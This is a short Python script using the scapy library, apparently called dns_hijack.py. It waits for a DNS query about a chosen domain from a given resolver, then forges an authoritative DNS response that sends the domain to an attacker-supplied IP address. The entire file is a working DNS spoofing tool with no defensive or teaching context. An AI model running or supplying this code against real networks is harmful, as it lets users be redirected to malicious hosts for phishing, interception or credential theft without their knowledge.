from scapy.all import *
from sys import argv

def send_spoofed_dns_response(original_pkt, spoofed_ip, target_domain):
    spoofed_response = IP(
        src=original_pkt[IP].dst,
        dst=original_pkt[IP].src
    ) / UDP(
        sport=53,
        dport=original_pkt[UDP].sport
    ) / DNS(
        id=original_pkt[DNS].id,
        qr=1,
        aa=1,
        qd=original_pkt[DNS].qd,
        an=DNSRR(rrname=target_domain + ".", ttl=3600, rdata=spoofed_ip)
    )

    send(spoofed_response, verbose=0)
    print(f"Spoofed DNS response sent: {target_domain} -> {spoofed_ip}")

def main():
    if len(sys.argv) != 4:
        print("Usage: python3 dns_hijack.py <target_dns_ip> <target_domain> <spoofed_ip>")
        sys.exit(1)

    target_ip = sys.argv[1]
    target_domain = sys.argv[2]
    spoofed_ip = sys.argv[3]

    print(f"Waiting for DNS query to {target_domain} from resolver {target_ip}...")

    def is_target_query(pkt):
        return (
            pkt.haslayer(DNS) and pkt.haslayer(IP) and pkt.haslayer(UDP)
            and pkt[DNS].qr == 0
            and pkt[IP].src == target_ip
            and pkt[DNS].qd
            and target_domain in pkt[DNS].qd.qname.decode()
        )

    while True:
        pkt = sniff(count=1, lfilter=is_target_query, timeout=20)
        if pkt:
            send_spoofed_dns_response(pkt[0], spoofed_ip, target_domain)
            break
        else:
            print("Still waiting for a valid DNS query...")

if __name__ == "__main__":
    main()
